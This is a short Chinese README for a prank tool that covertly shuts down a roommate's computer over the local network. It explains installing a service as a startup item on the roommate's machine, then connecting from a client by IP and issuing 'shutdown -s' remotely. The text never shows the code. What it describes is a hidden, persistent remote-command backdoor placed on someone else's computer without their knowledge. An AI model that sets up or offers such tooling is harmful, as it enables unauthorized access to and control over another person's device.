一个可以在不知道的情况下关闭室友电脑的程序(仅供娱乐)
注意：需要在同一局域网下进行操作，需要提前查看室友的IP

方法一:使用py文件，需要Python的运行环境
service在被控端启动(以管理员身份运行startup.bat将service.py设为开机自启)
client在控制端启动 输入室友的IP，连接成功后，在命令行中输入shutdown -s直接关机
。可选参数(-t 加上时间(秒))倒计时关闭

方法二:
利用打包好的exe文件
service被控端需要手动放入"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"目录下(设为开机自启)
client则直接运行即可。输入室友的IP，连接成功后，在命令行中输入shutdown -s直接关机
。可选参数(-t 加上时间(秒))倒计时关闭